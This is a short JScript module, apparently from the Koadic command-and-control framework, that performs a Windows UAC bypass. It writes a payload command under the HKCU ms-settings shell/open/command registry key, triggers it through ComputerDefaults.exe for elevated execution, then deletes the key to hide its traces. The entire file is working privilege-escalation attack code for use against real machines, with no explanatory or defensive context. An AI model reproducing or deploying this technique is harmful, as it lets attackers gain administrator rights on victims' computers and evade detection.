try
{
    // not sure if this is needed, but it can't hurt, right?
    var consentpath = "SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System";
    var consentval = Koadic.registry.read(Koadic.registry.HKLM, consentpath, "ConsentPromptBehaviorAdmin", Koadic.registry.DWORD).uValue;
    if (consentval == 2)
    {
        var e = Error('Consent value is too high!');
        throw e;
    }

    var path = 'Software\\Classes\\ms-settings\\shell\\open\\command';
    Koadic.registry.write(Koadic.registry.HKCU, path, 'DelegateExecute', '', Koadic.registry.STRING);
    Koadic.registry.write(Koadic.registry.HKCU, path, '', '~PAYLOAD_DATA~', Koadic.registry.STRING);

    Koadic.shell.run("ComputerDefaults.exe", true);

    Koadic.work.report("Completed");

    var now = new Date().getTime();
    while (new Date().getTime() < now + 10000);

    if (Koadic.registry.destroy(Koadic.registry.HKCU, path, "") != 0)
    {
        Koadic.shell.run("reg delete HKCU\\"+path+" /f", true);
    }
}
catch (e)
{
    Koadic.work.error(e);
}

Koadic.exit();
